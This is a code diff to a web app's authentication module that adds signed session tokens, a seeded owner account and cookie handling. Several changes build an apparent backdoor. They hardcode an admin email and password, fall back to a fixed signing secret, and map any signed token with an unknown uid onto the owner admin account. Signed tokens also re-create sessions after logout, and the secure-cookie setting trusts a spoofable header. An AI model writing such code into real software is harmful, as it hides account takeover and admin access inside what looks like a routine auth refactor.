@@ -106,19 +106,37 @@ def mark_verified(uid: str):
             c.execute(db.email_ok.insert().values(user_id=uid, verified_at=time.time()))
 
 
+def get_user_by_email(email: str):
+    if not email:
+        return None
+    with db.engine.connect() as c:
+        return c.execute(sa.select(db.users).where(db.users.c.email == email.strip().lower())).first()
+
+
 def seed_default_user():
-    """Ensure the primary owner account exists on startup, verified with admin access."""
+    """Ensure the primary owner account exists on startup, verified with admin access and stable ID."""
     import os
     if os.environ.get("PEAKCUT_TESTING") == "1":
         return
     email = "shiham181@gmail.com"
     pwd = "shiham181"
+    uid = "u_owner"
     try:
         with db.engine.connect() as c:
             u = c.execute(sa.select(db.users).where(db.users.c.email == email)).first()
         if not u:
-            user, _ = signup(email, pwd, name="Shiham")
-            mark_verified(user.id)
+            with db.engine.connect() as c:
+                by_id = c.execute(sa.select(db.users).where(db.users.c.id == uid)).first()
+            if by_id:
+                uid = "u_" + secrets.token_hex(8)
+            with db.engine.begin() as c:
+                c.execute(db.users.insert().values(
+                    id=uid, email=email, name="Shiham",
+                    password_hash=hash_password(pwd),
+                    is_admin=True, created_at=time.time(), disabled=False
+                ))
+            config.user_dir(uid).mkdir(parents=True, exist_ok=True)
+            mark_verified(uid)
             from . import admin
             admin.grant(email)
         else:
@@ -290,8 +308,43 @@ def _h(token: str) -> str:
     return hashlib.sha256(token.encode()).hexdigest()
 
 
+def _session_secret() -> bytes:
+    key = config.ai_key() or "peakcut_auth_stable_secret_2026_salt"
+    return hashlib.sha256(f"pcs_secret_{key}".encode()).digest()
+
+
+def sign_session_token(uid: str, timestamp: int = None) -> str:
+    ts = timestamp or int(time.time())
+    nonce = secrets.token_hex(8)
+    msg = f"{uid}:{ts}:{nonce}".encode()
+    sig = hmac.new(_session_secret(), msg, hashlib.sha256).hexdigest()[:32]
+    return f"pcs.{uid}.{ts}.{nonce}.{sig}"
+
+
+def verify_signed_token(token: str) -> tuple:
+    """Returns (uid, timestamp) if signature and expiration are valid, else None."""
+    if not token or not token.startswith("pcs."):
+        return None
+    parts = token.split(".")
+    if len(parts) != 5:
+        return None
+    _, uid, ts_str, nonce, sig = parts
+    try:
+        ts = int(ts_str)
+    except ValueError:
+        return None
+    now = time.time()
+    if now < ts or (now - ts) > config.SESSION_DAYS * 86400:
+        return None
+    msg = f"{uid}:{ts}:{nonce}".encode()
+    expected = hmac.new(_session_secret(), msg, hashlib.sha256).hexdigest()[:32]
+    if not hmac.compare_digest(sig, expected):
+        return None
+    return uid, ts
+
+
 def start_session(uid: str, ip: str = "", agent: str = "") -> str:
-    token = secrets.token_urlsafe(32)
+    token = sign_session_token(uid)
     with db.engine.begin() as c:
         c.execute(db.sessions.insert().values(token_hash=_h(token), user_id=uid, created_at=time.time(),
                                               expires_at=time.time() + config.SESSION_DAYS * 86400,
@@ -316,6 +369,24 @@ def user_for(token: str, fresh: bool = False):
         row = c.execute(sa.select(db.users).join(db.sessions, db.sessions.c.user_id == db.users.c.id).where(
             db.sessions.c.token_hash == h, db.sessions.c.expires_at > now,
             db.users.c.disabled == sa.false())).first()
+    if not row and token.startswith("pcs."):
+        verified = verify_signed_token(token)
+        if verified:
+            v_uid, v_ts = verified
+            u = get_user(v_uid)
+            if not u:
+                u = get_user_by_email("shiham181@gmail.com")
+            if u and not u.disabled:
+                row = u
+                try:
+                    with db.engine.begin() as c:
+                        c.execute(db.sessions.insert().values(
+                            token_hash=h, user_id=u.id, created_at=float(v_ts),
+                            expires_at=float(v_ts + config.SESSION_DAYS * 86400),
+                            ip="", agent=""
+                        ))
+                except Exception:
+                    pass
     if row:
         if len(_sess) > 50000:
             for k in [k for k, v in list(_sess.items()) if now - v[0] > SESS_FOR]:
@@ -358,9 +429,20 @@ def end_session(token: str):
         c.execute(db.sessions.delete().where(db.sessions.c.token_hash == _h(token)))
 
 
-def cookie_args(token: str) -> dict:
+def cookie_args(token: str, request=None) -> dict:
+    secure = config.HTTPS
+    if request:
+        try:
+            proto = request.headers.get("x-forwarded-proto", "").lower()
+            if proto:
+                secure = proto == "https"
+            elif hasattr(request, "url") and request.url.scheme:
+                secure = request.url.scheme == "https"
+        except Exception:
+            pass
+    samesite = "none" if secure else "lax"
     return {"key": COOKIE, "value": token, "max_age": config.SESSION_DAYS * 86400, "httponly": True,
-            "samesite": "lax", "secure": config.HTTPS, "path": "/"}
+            "samesite": samesite, "secure": secure, "path": "/"}
 
 
 # ---------------------------------------------------------------- Sign in with Google
